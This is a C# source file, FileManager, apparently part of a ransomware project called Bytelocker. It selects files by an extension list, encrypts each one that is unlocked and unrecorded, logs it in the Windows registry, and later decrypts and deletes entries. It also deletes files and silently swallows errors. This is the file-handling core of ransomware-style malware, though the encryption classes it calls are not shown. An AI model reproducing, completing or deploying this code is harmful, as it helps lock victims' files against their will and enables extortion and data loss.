using Bytelocker.Settings;
using System;
using System.IO;

namespace Bytelocker.CryptoManager
{
    class FileManager
    {
        private String file_path;
        private FileEncrypter fe;
        private RegistryManager rm;

        public FileManager()
        {
            this.fe = new FileEncrypter();
            this.rm = new RegistryManager();
        }

        public void ChooseFile(String file_path)
        {
            this.file_path = file_path;
        }

        public void DeleteFile()
        {
            try
            {
                File.Delete(this.file_path);
            } catch (Exception)
            {
            }
            
        }

        public void RenameTmpFileToOrig()
        {
            try
            {
                File.Move(this.file_path + FileEncrypter.FILE_EXTENSION_ENCRYPT_TMP, this.file_path);
            }
            catch (Exception)
            {
            }

        }

        public void SetupFileEncrypter()
        {
            this.fe.FetchPassword();
            this.fe.GenerateRandomSalt();
        }

        public void removeRegistryItem()
        {
            try
            {
                this.rm.DeleteValue(RegistryManager.FILES_KEY_NAME, this.file_path);
            }
            catch (System.ArgumentException)
            {
                // if the value does not exist in registry
            }
        }

        public bool DecryptFile()
        {
            bool success = false;
            
            if (File.Exists(this.file_path))
            {
                if (!(FileManager.IsFileLocked(this.file_path)) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, this.file_path) != "none")
                {
                    success = true;
                    this.fe.ChooseFile(this.file_path);
                    this.fe.Decrypt();
                    this.removeRegistryItem();
                }
            }

            return success;
        }

        public bool EncryptFile()
        {
            bool success = true;

            String file_extension = Path.GetExtension(this.file_path);

            if (!(IsFileLocked(this.file_path)) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, this.file_path) == "none" 
                && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(file_extension.ToLower()))
            {
                this.fe.ChooseFile(this.file_path);
                this.fe.Encrypt();
                this.rm.CreateBoolValue(RegistryManager.FILES_KEY_NAME, this.file_path, true);
            } else
            {
                success = false;
            }

            return success;
        }

        public static bool IsFileLocked(String path)
        {
            FileStream stream = null;
            FileInfo file = new FileInfo(path);

            try
            {
                stream = file.Open(FileMode.Open, FileAccess.Write, FileShare.None);
            }
            catch (Exception)
            {
                return true;
            }
            finally
            {
                if (stream != null)
                    stream.Close();
            }

            return false;
        }
    }

}
